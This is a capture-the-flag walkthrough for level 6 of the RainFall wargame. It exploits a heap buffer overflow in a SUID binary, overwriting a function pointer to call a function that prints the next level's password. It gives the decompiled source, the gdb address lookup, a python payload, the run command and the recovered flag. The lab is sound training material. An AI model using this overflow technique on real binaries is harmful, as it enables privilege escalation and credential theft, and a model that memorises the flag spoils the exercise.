# RainFall Level06 Walkthrough

## Step 1: Overview

Connect to the RainFall server:

```bash
ssh level6@${RAINFALL_IP} -p 4242
```

List the binary:

```bash
level6@RainFall:~$ ls -l
-rwsr-s---+ 1 level7 users 7552 Aug 30  2022 level6
```

This binary is SUID-owned by `level7`. The vulnerability lies in a heap-based buffer overflow that allows us to overwrite a function pointer.

---

## Step 2: Source Code Summary

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

int n() {
    return system("/bin/cat /home/user/level7/.pass");
}

int m() {
    return puts("Nope");
}

int main(int argc, char** argv, char** envp) {
    char* user_input = malloc(64);
    int (**function_ptr)() = malloc(sizeof(void*));

    *function_ptr = m;
    strcpy(user_input, argv[1]);

    return (*function_ptr)();
}
```

* `strcpy()` is used to copy user input into a 64-byte buffer allocated on the heap.
* A function pointer `function_ptr` is allocated directly after the buffer.
* If we overflow the buffer, we can overwrite the function pointer.

---

## Step 3: Function Address

Use GDB to find the address of the `n()` function:

```bash
(gdb) info functions
...
0x08048454  n
```

So:

```bash
n() = 0x08048454
```

---

## Step 4: Offset and Payload

To overwrite the function pointer, we must write:

* 64 bytes of padding to reach the end of the buffer
* +8 bytes of heap metadata (typical for glibc malloc)
* Then overwrite the 4 bytes of the function pointer

So total padding = **72 bytes**.

Craft payload:

```bash
python -c 'print("A"*72 + "\x54\x84\x04\x08")' > /tmp/level6.exploit
```

---

## Step 5: Execute the Exploit

```bash
./level6 $(cat /tmp/level6.exploit)
```

This redirects the function pointer to `n()`, which executes the command to print the password.

---

## Step 6: Retrieving the Flag

```bash
$ cat /home/user/level7/.pass
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

---

## Step 7: Move to Level07

```bash
level6@RainFall:~$ su level7
Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```
